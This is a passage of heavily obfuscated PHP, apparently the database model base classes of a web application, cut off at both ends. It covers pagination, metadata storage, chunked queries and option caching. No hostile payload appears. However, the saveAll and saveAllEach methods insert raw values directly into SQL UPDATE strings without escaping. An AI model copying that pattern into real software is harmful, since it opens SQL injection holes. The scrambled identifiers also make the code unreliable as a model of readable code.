$¶æî ß‰ = intval(isset($in[$Ì®‹€§[440]]) && $in[$Ì®‹€§[440]] ? $in[$Ì®‹€§[440]] : $¶æî ß‰); $¶æî ß‰ = $¶æî ß‰ <= 1 ? 1 : $¶æî ß‰; $ÀÍ®áüÕ = array(); $¬€£İğ» = 1; if ($¶æî ß‰ == 1 && $¬€£İğ») { $this->optionsValue($¿¾¿™ó); $ÀÍ®áüÕ = $this->page($¶æî ß‰, $¦Î ò„Á)->select(); $±ì„Ü = is_array($ÀÍ®áüÕ) ? count($ÀÍ®áüÕ) : 0; if ($±ì„Ü < $¦Î ò„Á) { $İ³‹ÓÊ› = 1; } else { $this->optionsValue($àÇÂëÖü); $±ì„Ü = intval($this->count()); $İ³‹ÓÊ› = ceil($±ì„Ü / $¦Î ò„Á); } } else { $this->optionsValue($àÇÂëÖü); $±ì„Ü = intval($this->count()); $İ³‹ÓÊ› = ceil($±ì„Ü / $¦Î ò„Á); $¶æî ß‰ = $¶æî ß‰ >= $İ³‹ÓÊ› ? $İ³‹ÓÊ› : $¶æî ß‰; $this->optionsValue($¿¾¿™ó); $ÀÍ®áüÕ = $this->page($¶æî ß‰, $¦Î ò„Á)->select(); } if (!is_array($ÀÍ®áüÕ)) { $ÀÍ®áüÕ = array(); } if ($İ³‹ÓÊ› == 1) { $±ì„Ü = count($ÀÍ®áüÕ); } $¥’†¹¡ä = array($Ì®‹€§[454] => array($Ì®‹€§[455] => $±ì„Ü, $Ì®‹€§[451] => $¦Î ò„Á, $Ì®‹€§[440] => $¶æî ß‰, $Ì®‹€§[456] => $İ³‹ÓÊ›), $Ì®‹€§[457] => $ÀÍ®áüÕ); return $¥’†¹¡ä; } protected function checkLength($çĞùâ, $Öà¥ºàÈ = 0, $î»Ñ—€× = '') { $Ü÷¡ƒùñ =& $_SERVER[¼èá¯æÙ]; $Öà¥ºàÈ = $Öà¥ºàÈ ? $Öà¥ºàÈ : 65536; if (!$çĞùâ || strlen($çĞùâ) < $Öà¥ºàÈ) { return; } $î»Ñ—€× = $î»Ñ—€× ? $î»Ñ—€× . $Ü÷¡ƒùñ[84] : $Ü÷¡ƒùñ[12]; show_json($î»Ñ—€× . LNG($Ü÷¡ƒùñ[458]) . "\50{$Öà¥ºàÈ}\x29", !1); } protected function metaSet($ùäÕçÍ», $ÚÙËÅ” = null, $ì¶£—À = null) { $¬Š‹şË  =& $_SERVER[¼èá¯æÙ]; if (!$this->tableMeta || !$ùäÕçÍ») { return !1; } $Úô§«§ = $this->tableMeta[$¬Š‹şË [459]]; $ˆæå­öë = $this->tableMeta[$¬Š‹şË [460]]; $¥³êÑï = Model($ˆæå­öë); $‚›…¥õ = array($Úô§«§ => $ùäÕçÍ», $¬Š‹şË [461] => $ÚÙËÅ”); if (is_null($ÚÙËÅ”)) { return $¥³êÑï->where(array($Úô§«§ => $ùäÕçÍ»))->delete(); } if (is_null($ì¶£—À) && is_string($ÚÙËÅ”)) { return $¥³êÑï->where($‚›…¥õ)->delete(); } $ÂÊ›Âãê = is_array($ÚÙËÅ”) ? $ÚÙËÅ” : array(); if (is_string($ÚÙËÅ”)) { $ÂÊ›Âãê[$ÚÙËÅ”] = $ì¶£—À; } $“é²à— = array(); foreach ($ÂÊ›Âãê as $Ğ­œûŞÅ => $Ó —‚­°) { if (is_null($Ó —‚­°) && is_string($Ğ­œûŞÅ)) { $¥³êÑï->where(array($Úô§«§ => $ùäÕçÍ», $¬Š‹şË [461] => $Ğ­œûŞÅ))->delete(); continue; } $this->checkLength($Ó —‚­°, !1, $ˆæå­öë . $¬Š‹şË [4] . $Ğ­œûŞÅ); $“é²à—[] = array($Úô§«§ => $ùäÕçÍ», $¬Š‹şË [107] => $Ğ­œûŞÅ, $¬Š‹şË [462] => $Ó —‚­°); } $Æú†åÚ = $¬Š‹şË [463] . $ˆæå­öë; CacheLock::lock($Æú†åÚ); $¥³êÑï->where(array($Úô§«§ => $ùäÕçÍ»))->addAll($“é²à—, array(), !0); CacheLock::unlock($Æú†åÚ); return !0; } public function metaGet($ö“Ÿ£•, $ÜàÂÒà = false) { $€Ôáó©É =& $_SERVER[¼èá¯æÙ]; if (!$this->tableMeta) { return array(); } $÷‹×çÊ = $this->tableMeta[$€Ôáó©É[459]]; $àøè¨ºÃ = Model($this->tableMeta[$€Ôáó©É[460]]); if ($ÜàÂÒà) { $¦şÕ©“ = array($÷‹×çÊ => $ö“Ÿ£•, $€Ôáó©É[107] => $ÜàÂÒà); return $àøè¨ºÃ->where($¦şÕ©“)->getField($€Ôáó©É[462]); } $¦şÕ©“ = array($÷‹×çÊ => $ö“Ÿ£•); $É‰¿Ë = $àøè¨ºÃ->field($€Ôáó©É[464])->where($¦şÕ©“)->select(); $É‰¿Ë = array_to_keyvalue($É‰¿Ë, $€Ôáó©É[107], $€Ôáó©É[462]); return $É‰¿Ë; } private function checkDataAutoHas($èÁ¾åÅ©) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $¤•Å¢¶ö) { if (in_array($èÁ¾åÅ©, explode($_SERVER[¼èá¯æÙ][50], $¤•Å¢¶ö[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$•Òßñø, $êí˜¨‚) { $Í««İÖ¬ =& $_SERVER[¼èá¯æÙ]; if (!is_array($•Òßñø)) { return; } foreach ($this->dataAuto as $˜é…ş²) { $¢²ß·¶ç = $˜é…ş²[0]; if (!in_array($êí˜¨‚, explode($Í««İÖ¬[50], $˜é…ş²[2]))) { continue; } switch (trim($˜é…ş²[3])) { case $Í««İÖ¬[408]: case $Í««İÖ¬[409]: $Ë»ıªÆÌ = $˜é…ş²[1]; $İ‹Şø›· = isset($˜é…ş²[4]) ? (array) $˜é…ş²[4] : array(); if ($Ë»ıªÆÌ == $Í««İÖ¬[216] && array_key_exists($¢²ß·¶ç, $•Òßñø)) { if (!$•Òßñø[$¢²ß·¶ç]) { unset($•Òßñø[$¢²ß·¶ç]); } break; } if (isset($•Òßñø[$¢²ß·¶ç])) { array_unshift($İ‹Şø›·, $•Òßñø[$¢²ß·¶ç]); } if ($Í««İÖ¬[408] == $˜é…ş²[3]) { $•Òßñø[$¢²ß·¶ç] = call_user_func_array($Ë»ıªÆÌ, $İ‹Şø›·); } else { $•Òßñø[$¢²ß·¶ç] = call_user_func_array(array(&$this, $Ë»ıªÆÌ), $İ‹Şø›·); } break; case $Í««İÖ¬[359]: if (isset($•Òßñø[$¢²ß·¶ç]) && $•Òßñø[$¢²ß·¶ç]) { $•Òßñø[$¢²ß·¶ç] = call_user_func_array(array(&$this, $˜é…ş²[1]), array($•Òßñø[$¢²ß·¶ç])); } break; case $Í««İÖ¬[362]: $•Òßñø[$¢²ß·¶ç] = $•Òßñø[$˜é…ş²[1]]; break; case $Í««İÖ¬[381]: if (isset($•Òßñø[$¢²ß·¶ç]) && !is_string($•Òßñø[$¢²ß·¶ç])) { $•Òßñø[$¢²ß·¶ç] = json_encode_force($•Òßñø[$¢²ß·¶ç]); } break; case $Í««İÖ¬[410]: if ($•Òßñø[$¢²ß·¶ç] === $Í««İÖ¬[12]) { unset($•Òßñø[$¢²ß·¶ç]); } break; case $Í««İÖ¬[411]: $•Òßñø[$¢²ß·¶ç] = $˜é…ş²[1]; default: break; } } if ($êí˜¨‚ == $Í««İÖ¬[442]) { $±úêåê  = strtolower($this->db->getDbType()); if (strpos($±úêåê , $Í««İÖ¬[13]) !== 0) { return; } $Ğ›ü°‘ = $this->field(!0)->fields; $‘ô–üÌ = $Ğ›ü°‘[$Í««İÖ¬[341]]; if (isset($Ğ›ü°‘[$Í««İÖ¬[340]])) { unset($‘ô–üÌ[$Ğ›ü°‘[$Í««İÖ¬[340]]]); } foreach ($‘ô–üÌ as $¦¦†â¹Ş => $êí˜¨‚) { if (!isset($•Òßñø[$¦¦†â¹Ş])) { $•Òßñø[$¦¦†â¹Ş] = $Í««İÖ¬[12]; } } } } private function dataAfterFilter(&$ùöİº„õ) { $¬‰‡¯Ùã =& $_SERVER[¼èá¯æÙ]; foreach ($this->dataAuto as $ØìÙº…Ï) { $şŠîõç = $ØìÙº…Ï[0]; if (!isset($ùöİº„õ[$şŠîõç])) { continue; } if (!in_array($¬‰‡¯Ùã[444], explode($¬‰‡¯Ùã[50], $ØìÙº…Ï[2]))) { continue; } switch (trim($ØìÙº…Ï[3])) { case $¬‰‡¯Ùã[408]: case $¬‰‡¯Ùã[409]: $ïéıÚÚ = isset($ØìÙº…Ï[4]) ? (array) $ØìÙº…Ï[4] : array(); array_unshift($ïéıÚÚ, $ùöİº„õ[$şŠîõç]); if (isset($ØìÙº…Ï[4]) && $ØìÙº…Ï[4] == $¬‰‡¯Ùã[465]) { $ïéıÚÚ = array($ùöİº„õ[$şŠîõç]); } if ($¬‰‡¯Ùã[408] == $ØìÙº…Ï[3]) { $ùöİº„õ[$şŠîõç] = call_user_func_array($ØìÙº…Ï[1], $ïéıÚÚ); } else { $ùöİº„õ[$şŠîõç] = call_user_func_array(array(&$this, $ØìÙº…Ï[1]), $ïéıÚÚ); } break; case $¬‰‡¯Ùã[359]: if (isset($ùöİº„õ[$şŠîõç]) && $ùöİº„õ[$şŠîõç]) { $ùöİº„õ[$şŠîõç] = call_user_func_array(array(&$this, $ØìÙº…Ï[1]), array($ùöİº„õ[$şŠîõç])); } break; case $¬‰‡¯Ùã[362]: $ùöİº„õ[$şŠîõç] = $ùöİº„õ[$ØìÙº…Ï[1]]; break; case $¬‰‡¯Ùã[381]: $º‘­²êÓ = $ùöİº„õ[$şŠîõç]; $ùöİº„õ[$şŠîõç] = json_decode($º‘­²êÓ, !0); if (is_null($ùöİº„õ[$şŠîõç])) { $ùöİº„õ[$şŠîõç] = $º‘­²êÓ; } break; case $¬‰‡¯Ùã[410]: if ($ùöİº„õ[$şŠîõç] === $¬‰‡¯Ùã[12]) { unset($ùöİº„õ[$şŠîõç]); } break; case $¬‰‡¯Ùã[411]: $ùöİº„õ[$şŠîõç] = $ØìÙº…Ï[1]; break; default: break; } } } public function saveAll($®ì¶Şõå) { $¯Áú¡óÃ =& $_SERVER[¼èá¯æÙ]; $ø»‹ê¥¼ = $this->tablePrefix . $this->tableName; $§øŠãÏ = self::SQL_WHERE_IN_CHUNK; $®ì¶Şõå = is_array($®ì¶Şõå) ? $®ì¶Şõå : array(); $¼¼º¡îš = $¯Áú¡óÃ[63]; $şŸü¾íŸ = 0; $§¤‰ëóò = array(); $‹ß±Ò±µ = count($®ì¶Şõå); for ($ê¬´ÈÅè = 0; $ê¬´ÈÅè < $‹ß±Ò±µ; $ê¬´ÈÅè++) { $èòìç€ = $®ì¶Şõå[$ê¬´ÈÅè]; if (!is_array($èòìç€) || count($èòìç€) != 4) { continue; } $ÌıŠŸªü = "\x55\x50\104\101\124\105\40\140{$ø»‹ê¥¼}\x60\40\123\105\x54\x20{$èòìç€[2]}\40\x3d\x20\x43\x41\x53\105\40{$èòìç€[0]}\x20\12"; if ($şŸü¾íŸ == 0) { $¼¼º¡îš = $ÌıŠŸªü; } $§¤‰ëóò[] = $¯Áú¡óÃ[131] . $èòìç€[1] . $¯Áú¡óÃ[131]; $şŸü¾íŸ++; $¼¼º¡îš .= "\40\127\x48\x45\116\40\x27{$èòìç€[1]}\47\x20\124\110\x45\116\40\x27{$èòìç€[3]}\x27\40\12"; if ($şŸü¾íŸ == $§øŠãÏ || $ê¬´ÈÅè == $‹ß±Ò±µ - 1) { $‰´Å›Åš = implode($¯Áú¡óÃ[50], $§¤‰ëóò); $¼¼º¡îš .= "\x20\105\116\x44\40\40\127\x48\105\x52\x45\x20{$èòìç€[0]}\x20\111\x4e\x20\x28{$‰´Å›Åš}\x29\40"; $this->execute($¼¼º¡îš); $şŸü¾íŸ = 0; $¼¼º¡îš = $ÌıŠŸªü; $this->chunkEventCheck(count($§¤‰ëóò)); $§¤‰ëóò = array(); } } $this->chunkEventSet(); } public function saveAllEach($–‡¡¼›á) { $Äëˆ–àş =& $_SERVER[¼èá¯æÙ]; $¨›„åÏ = $this->tablePrefix . $this->tableName; foreach ($–‡¡¼›á as $Üö‚ù) { if (!is_array($Üö‚ù) || count($Üö‚ù) != 4) { continue; } $Æü¬à¯ã = $Üö‚ù[0] . $Äëˆ–àş[466] . $Üö‚ù[1] . $Äëˆ–àş[131]; $ÀÈÊè»Ç = $Üö‚ù[2] . $Äëˆ–àş[466] . $Üö‚ù[3] . $Äëˆ–àş[131]; $µÑŒÑ¿® = "\165\160\144\x61\x74\x65\x20{$¨›„åÏ}\40\163\145\164\40{$ÀÈÊè»Ç}\40\x77\x68\x65\162\x65\40{$Æü¬à¯ã}\x3b"; $this->execute($µÑŒÑ¿®); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($éÒÃÚõì = false, $¹ì±ãçÕ = false) { $this->_chunkEvent = $éÒÃÚõì; $this->_chunkEventParam = $¹ì±ãçÕ; } private function chunkEventCheck($£ëÛÈ«Ù) { if (!$this->_chunkEvent) { return; } $Æ¾Õ¬‘  = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $Æ¾Õ¬‘ [$_SERVER[¼èá¯æÙ][467]] = $£ëÛÈ«Ù; Hook::trigger($this->_chunkEvent, $Æ¾Õ¬‘ ); } public function addAll($Ğò®‚ß’, $Õ¡½Ñ“Ì = array(), $Ä¿õÓ²¦ = false) { $ÎíŠ¥¯ =& $_SERVER[¼èá¯æÙ]; ignore_timeout(); $—»¯¸Íø = self::SQL_WHERE_IN_CHUNK; if (empty($Ğò®‚ß’)) { $this->error = think_lang($ÎíŠ¥¯[360]); return !1; } $Õ¡½Ñ“Ì = $this->_parseOptions($Õ¡½Ñ“Ì); foreach ($Ğò®‚ß’ as $ñÆ£Ô‡ => $•Óú£‹) { $Ğò®‚ß’[$ñÆ£Ô‡] = $this->_facade($•Óú£‹); $this->_beforeInsert($Ğò®‚ß’[$ñÆ£Ô‡], $Õ¡½Ñ“Ì); } if (method_exists($this->db, $ÎíŠ¥¯[361])) { for ($€“’æ“â = 0; $€“’æ“â < count($Ğò®‚ß’); $€“’æ“â += $—»¯¸Íø) { $Ó¼ì¨«œ = array_slice($Ğò®‚ß’, $€“’æ“â, $—»¯¸Íø); if (!is_array($Ó¼ì¨«œ) || count($Ó¼ì¨«œ) == 0) { break; } $æòô÷ = $this->db->insertAll($Ó¼ì¨«œ, $Õ¡½Ñ“Ì, $Ä¿õÓ²¦); $this->chunkEventCheck(count($Ó¼ì¨«œ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($Ğò®‚ß’ as $ñÆ£Ô‡ => $•Óú£‹) { $æòô÷ = $this->db->insert($•Óú£‹, $Õ¡½Ñ“Ì, $Ä¿õÓ²¦); } $this->commit(); } if (!1 !== $æòô÷) { $öÆƒ¯ò½ = $this->getLastInsID(); if ($öÆƒ¯ò½) { return $öÆƒ¯ò½; } } return $æòô÷; } public function save($Ç‘Ÿ£İ¨ = '', $îûâ¦ = array()) { $ß¬ƒÏĞ’ =& $_SERVER[¼èá¯æÙ]; $ÊÎÀÜ‹ = self::SQL_WHERE_IN_CHUNK; $àŠ¤‹¾¿ = $this->optionsValue(); $Ú‘¾çª = $this->findWhereField($àŠ¤‹¾¿); if (!$Ú‘¾çª) { return parent::save($Ç‘Ÿ£İ¨, $îûâ¦); } $éø¥…Ãı = 0; $Ë€‚³² = $àŠ¤‹¾¿[$ß¬ƒÏĞ’[364]][$Ú‘¾çª][1]; $Ë€‚³² = is_array($Ë€‚³²) ? $Ë€‚³² : array(); $öï©€•ô = count($Ë€‚³²); for ($ÊöÆµğ– = 0; $ÊöÆµğ– < $öï©€•ô; $ÊöÆµğ– += $ÊÎÀÜ‹) { $ƒåÓ–© = array_slice($Ë€‚³², $ÊöÆµğ–, $ÊÎÀÜ‹); if (!is_array($ƒåÓ–©) || count($ƒåÓ–©) == 0) { break; } $àŠ¤‹¾¿[$ß¬ƒÏĞ’[364]][$Ú‘¾çª][1] = $ƒåÓ–©; $this->optionsValue($àŠ¤‹¾¿); $éø¥…Ãı += parent::save($Ç‘Ÿ£İ¨, $îûâ¦); $this->chunkEventCheck(count($ƒåÓ–©)); } $this->chunkEventSet(); return $éø¥…Ãı; } public function add($†Âë×ÖÚ = '', $ïÍîæê¨ = array(), $¢™íñ»İ = false) { if ($this->addTaskStatus && is_array($†Âë×ÖÚ)) { $this->addTaskData[] = $†Âë×ÖÚ; return; } return parent::add($†Âë×ÖÚ, $ïÍîæê¨, $¢™íñ»İ); } public function parseWhereLike($ã‚—‰ñ£, $“à‚ö¿÷ = '', $Õ•ëõÔ = false, &$ßÃ°ı½ = false) { $ˆîû‘¸Ó =& $_SERVER[¼èá¯æÙ]; $ó¬Š¤§ = $GLOBALS[$ˆîû‘¸Ó[6]][$ˆîû‘¸Ó[468]]; if (!$ó¬Š¤§[$ˆîû‘¸Ó[469]]) { return $ã‚—‰ñ£; } if (!is_array($ã‚—‰ñ£)) { return $ã‚—‰ñ£; } $ôØÜã = array(); $ı‡üªö˜ = 0; foreach ($ã‚—‰ñ£ as $¢Ä…šã => $ÃÜ¸ßÈŞ) { if (is_array($ÃÜ¸ßÈŞ) && count($ÃÜ¸ßÈŞ) == 2 && $ÃÜ¸ßÈŞ[0] == $ˆîû‘¸Ó[470] && is_string($ÃÜ¸ßÈŞ[1]) && substr($ÃÜ¸ßÈŞ[1], 0, 1) == $ˆîû‘¸Ó[471] && substr($ÃÜ¸ßÈŞ[1], strlen($ÃÜ¸ßÈŞ[1]) - 1, 1) == $ˆîû‘¸Ó[471]) { $ßÃ°ı½ = !0; $ÁÚáÁŞ¸ = is_string($¢Ä…šã) ? $¢Ä…šã : $“à‚ö¿÷; $×¯ö½êÁ = substr($ÃÜ¸ßÈŞ[1], 1, strlen($ÃÜ¸ßÈŞ[1]) - 2); $×¯ö½êÁ = $this->db->escapeString($×¯ö½êÁ); if (!strpos($ÁÚáÁŞ¸, $ˆîû‘¸Ó[10])) { $ÁÚáÁŞ¸ = $ˆîû‘¸Ó[472] . $ÁÚáÁŞ¸ . $ˆîû‘¸Ó[472]; } $Ñıù¸é” = $ˆîû‘¸Ó[232] . $×¯ö½êÁ . $ˆîû‘¸Ó[232]; $×¯ö½êÁ = str_replace(array($ˆîû‘¸Ó[10], $ˆîû‘¸Ó[473], $ˆîû‘¸Ó[11]), $ˆîû‘¸Ó[474], $×¯ö½êÁ); if ($ó¬Š¤§[$ˆîû‘¸Ó[475]]) { $Ñıù¸é” = $ˆîû‘¸Ó[476] . $×¯ö½êÁ . $ˆîû‘¸Ó[477]; if ($ó¬Š¤§[$ˆîû‘¸Ó[478]]) { $Ñıù¸é” = $ˆîû‘¸Ó[477] . $×¯ö½êÁ . $ˆîû‘¸Ó[476]; } } $ôØÜã[$ı‡üªö˜] = $ˆîû‘¸Ó[479] . $ÁÚáÁŞ¸ . $ˆîû‘¸Ó[480] . $Ñıù¸é” . $ˆîû‘¸Ó[481]; $ı‡üªö˜++; continue; } if (is_array($ÃÜ¸ßÈŞ)) { $“à‚ö¿÷ = is_string($¢Ä…šã) ? $¢Ä…šã : $“à‚ö¿÷; $ÃÜ¸ßÈŞ = $this->parseWhereLike($ÃÜ¸ßÈŞ, $“à‚ö¿÷, !0, $ßÃ°ı½); } if (is_numeric($¢Ä…šã)) { $ôØÜã[$ı‡üªö˜] = $ÃÜ¸ßÈŞ; $ı‡üªö˜++; } else { $ôØÜã[$¢Ä…šã] = $ÃÜ¸ßÈŞ; } } if ($ßÃ°ı½ && !$Õ•ëõÔ) { } return $ôØÜã; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($£ÃÛ» = array()) { $‰èÔØÀ¥ =& $_SERVER[¼èá¯æÙ]; $¢£¾û´§ = self::SQL_WHERE_IN_CHUNK; $™óÅ¥šÌ = $this->optionsValue(); $ëºĞÜÚË = $this->findWhereField($™óÅ¥šÌ); if (!$ëºĞÜÚË || isset($™óÅ¥šÌ[$‰èÔØÀ¥[379]]) || isset($™óÅ¥šÌ[$‰èÔØÀ¥[440]])) { return parent::select($£ÃÛ»); } $›ù²–üÏ = $™óÅ¥šÌ[$‰èÔØÀ¥[364]][$ëºĞÜÚË][1]; $›ù²–üÏ = is_array($›ù²–üÏ) ? $›ù²–üÏ : array(); $ºÄê“Ìø = null; for ($´ŒÊ‚² = 0; $´ŒÊ‚² < count($›ù²–üÏ); $´ŒÊ‚² += $¢£¾û´§) { $ÉµÁï§ = array_slice($›ù²–üÏ, $´ŒÊ‚², $¢£¾û´§); if (!is_array($ÉµÁï§) || count($ÉµÁï§) == 0) { break; } $™óÅ¥šÌ[$‰èÔØÀ¥[364]][$ëºĞÜÚË][1] = $ÉµÁï§; $this->optionsValue($™óÅ¥šÌ); $õ«¯„«‘ = parent::select($£ÃÛ»); if (!$õ«¯„«‘) { continue; } $ºÄê“Ìø = is_array($ºÄê“Ìø) ? $ºÄê“Ìø : array(); $ºÄê“Ìø = array_merge($ºÄê“Ìø, $õ«¯„«‘); } return $ºÄê“Ìø; } public function delete($ñ»¿·¤ = array()) { $à¥ú“ÌÈ =& $_SERVER[¼èá¯æÙ]; $ê¿ÙÁ» = self::SQL_WHERE_IN_CHUNK; $£Õß«Î = $this->optionsValue(); $ˆ¯™ô—Ó = $this->findWhereField($£Õß«Î); if (!$ˆ¯™ô—Ó) { return parent::delete($ñ»¿·¤); } $²­‰¹Ôã = 0; $Á½Üøˆá = $£Õß«Î[$à¥ú“ÌÈ[364]][$ˆ¯™ô—Ó][1]; $Á½Üøˆá = is_array($Á½Üøˆá) ? $Á½Üøˆá : array(); for ($ÔŸÈìÎš = 0; $ÔŸÈìÎš < count($Á½Üøˆá); $ÔŸÈìÎš += $ê¿ÙÁ») { $À¬‰‘å¿ = array_slice($Á½Üøˆá, $ÔŸÈìÎš, $ê¿ÙÁ»); if (!is_array($À¬‰‘å¿) || count($À¬‰‘å¿) == 0) { break; } $£Õß«Î[$à¥ú“ÌÈ[364]][$ˆ¯™ô—Ó][1] = $À¬‰‘å¿; $this->optionsValue($£Õß«Î); $²­‰¹Ôã += parent::delete($ñ»¿·¤); } return $²­‰¹Ôã; } private function findWhereField($òë‡‹û) { $Íİ¦€ŞÄ =& $_SERVER[¼èá¯æÙ]; $¼Ÿ®Ø‚ø = self::SQL_WHERE_IN_CHUNK; if (!is_array($òë‡‹û) || !is_array($òë‡‹û[$Íİ¦€ŞÄ[364]])) { return !1; } foreach ($òë‡‹û[$Íİ¦€ŞÄ[364]] as $¦ó‰Üš => $Ó‹À‹–ˆ) { if (is_array($Ó‹À‹–ˆ) && isset($Ó‹À‹–ˆ[0]) && is_string($Ó‹À‹–ˆ[0]) && strtolower($Ó‹À‹–ˆ[0]) == $Íİ¦€ŞÄ[7] && is_array($Ó‹À‹–ˆ[1]) && count($Ó‹À‹–ˆ[1]) > $¼Ÿ®Ø‚ø) { ignore_timeout(); return $¦ó‰Üš; } } return !1; } public function setMasterDB($ÀãÉ¨ë¯ = true) { think_config($_SERVER[¼èá¯æÙ][482], $ÀãÉ¨ë¯); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\163\x74\145\155\117\x70\x74\x69\157\x6e"; public $field = array(); public function listData($Êî„Ñê› = false, $± †´›ä = "\x6d\157\144\x69\146\171\x54\151\x6d\145", $Ú§«’½ö = false) { $²‘²¤’Ï = Model($this->modelType)->get(!1, $this->optionType, !0); $±çÖÚé™ = array_values($²‘²¤’Ï); if ($±çÖÚé™ && $±çÖÚé™[0] && !is_array($±çÖÚé™[0])) { Model($this->modelType)->cacheRemove($this->optionType); $²‘²¤’Ï = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$²‘²¤’Ï) { return $Êî„Ñê› ? null : array(); } if (!$Êî„Ñê›) { $²‘²¤’Ï = array_filter(array_values($²‘²¤’Ï)); return array_sort_by($²‘²¤’Ï, $± †´›ä, $Ú§«’½ö); } return $²‘²¤’Ï[$_SERVER[¼èá¯æÙ][483] . $Êî„Ñê›]; } public function insert($¿û–ş´) { $°ÃÆ“’… =& $_SERVER[¼èá¯æÙ]; $¿û–ş´ = array_field_key($¿û–ş´, $this->field); $‡ïÜø¾— = Model($this->modelType)->get($°ÃÆ“’…[484], $this->optionType . $°ÃÆ“’…[485]); $‡ïÜø¾— = $‡ïÜø¾— ? $‡ïÜø¾— : 0; $¿û–ş´[$°ÃÆ“’…[486]] = ++$‡ïÜø¾—; $¿û–ş´[$°ÃÆ“’…[243]] = time(); $¿û–ş´[$°ÃÆ“’…[98]] = time(); Model($this->modelType)->set($°ÃÆ“’…[484], $‡ïÜø¾—, $this->optionType . $°ÃÆ“’…[485]); Model($this->modelType)->set($°ÃÆ“’…[483] . $‡ïÜø¾—, $¿û–ş´, $this->optionType); return $‡ïÜø¾—; } public function update($îğç½æƒ, $Ú±œ¿…­) { $ô¢ä‰µû =& $_SERVER[¼èá¯æÙ]; $Ú±œ¿…­ = array_field_key($Ú±œ¿…­, $this->field); $ÇŠàõıå = $this->listData($îğç½æƒ); if (!$ÇŠàõıå || !$îğç½æƒ) { return !1; } $Ú±œ¿…­ = array_merge($ÇŠàõıå, $Ú±œ¿…­); $Ú±œ¿…­[$ô¢ä‰µû[98]] = time(); return Model($this->modelType)->set($ô¢ä‰µû[483] . $îğç½æƒ, $Ú±œ¿…­, $this->optionType); } public function remove($†¿äéº) { if (!$†¿äéº) { return !1; } return Model($this->modelType)->remove($_SERVER[¼èá¯æÙ][483] . $†¿äéº, $this->optionType); } public function clear() { $¿ÓìÎ¤§ =& $_SERVER[¼èá¯æÙ]; Model($this->modelType)->remove($¿ÓìÎ¤§[484], $this->optionType . $¿ÓìÎ¤§[485]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($Œá„ —Š, $ÑËÏÉûø) { if (!$ÑËÏÉûø) { return !1; } $¸€ë˜ò• = $this->listData(); $¸€ë˜ò• = array_to_keyvalue($¸€ë˜ò•, $Œá„ —Š); return isset($¸€ë˜ò•[$ÑËÏÉûø]) ? $¸€ë˜ò•[$ÑËÏÉûø] : !1; } public function findByName($Î•‚²šœ) { return $this->findByKey($_SERVER[¼èá¯æÙ][32], $Î•‚²šœ); } protected function resetData($—·†¥È) { $óøœ°›• =& $_SERVER[¼èá¯æÙ]; $—·†¥È = is_array($—·†¥È) ? $—·†¥È : array(); $Îéùª = array(); for ($ıäÜÚ¾È = 0; $ıäÜÚ¾È < count($—·†¥È); $ıäÜÚ¾È++) { $Îéùª[$óøœ°›•[483] . $—·†¥È[$ıäÜÚ¾È][$óøœ°›•[486]]] = $—·†¥È[$ıäÜÚ¾È]; } return Model($this->modelType)->set($Îéùª, !1, $this->optionType); } private function getAutoName($ó®´ñ³¿) { $ä®€Ç = array_to_keyvalue($this->listData(), $_SERVER[¼èá¯æÙ][32]); if (!$ä®€Ç || !isset($ä®€Ç[$ó®´ñ³¿])) { return $ó®´ñ³¿; } for ($ÖËÂƒÏ¼ = 1; $ÖËÂƒÏ¼ < count($ä®€Ç); $ÖËÂƒÏ¼++) { $ÚêÎ¨ = $ó®´ñ³¿ . "\50{$ÖËÂƒÏ¼}\51"; if (!isset($ä®€Ç[$ÚêÎ¨])) { return $ÚêÎ¨; } } return $ÚêÎ¨; } } goto b‘×½¹”»µ; b‘×½¹”»µ: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ƒ¿é–Ò¸ = false, $æ¼ãëøÔ = '', $‘Ê€ÅöÉ = false) { $İˆ£ÈÂ™ =& $_SERVER[¼èá¯æÙ]; $ñ‚†¨Ê = $this->cacheGet($æ¼ãëøÔ); $ÂİíãÉ = $this->optionDefault($æ¼ãëøÔ); $ÂİíãÉ = is_array($ÂİíãÉ) ? $ÂİíãÉ : array(); if (is_array($ñ‚†¨Ê)) { $ñ‚†¨Ê = array_merge($ÂİíãÉ, $ñ‚†¨Ê); return $ƒ¿é–Ò¸ ? isset($ñ‚†¨Ê[$ƒ¿é–Ò¸]) ? $ñ‚†¨Ê[$ƒ¿é–Ò¸] : null : $ñ‚†¨Ê; } $á…•™İ« = $this->filterWhere(array($İˆ£ÈÂ™[33] => $æ¼ãëøÔ)); $ñ‚†¨Ê = $this->where($á…•™İ«)->select(); $ñ‚†¨Ê = array_to_keyvalue($ñ‚†¨Ê, $İˆ£ÈÂ™[107], $İˆ£ÈÂ™[462]); foreach ($ñ‚†¨Ê as $û©¬‰Š¼ => $å¹ğö†) { if ($‘Ê€ÅöÉ || in_array($û©¬‰Š¼, $this->jsonField)) { $ñ‚†¨Ê[$û©¬‰Š¼] = json_decode($å¹ğö†, !0); } } $this->cacheSet($æ¼ãëøÔ, $ñ‚†¨Ê); $ñ‚†¨Ê = array_merge($ÂİíãÉ, $ñ‚†¨Ê); return $ƒ¿é–Ò¸ ? $ñ‚†¨Ê[$ƒ¿é–Ò¸] : $ñ‚†¨Ê; } public function set($¬¾âÒË¼, $×şçÁâË = false, $ÑÕ¿ ©÷ = '') { $Ê–‘™‰ª =& $_SERVER[¼èá¯æÙ]; $this->cacheRemove($ÑÕ¿ ©÷); $ä®÷í© = array(); $å”í­ÎÔ = is_array($¬¾âÒË¼) ? $¬¾âÒË¼ : array($¬¾âÒË¼ => $×şçÁâË); foreach ($å”í­ÎÔ as $ÁŸÍ¡Î¶ => $©áÊäñ×) { if (is_array($©áÊäñ×)) { $©áÊäñ× = json_encode_force($©áÊäñ×); } $this->checkLength($©áÊäñ×, !1, $this->tableName . 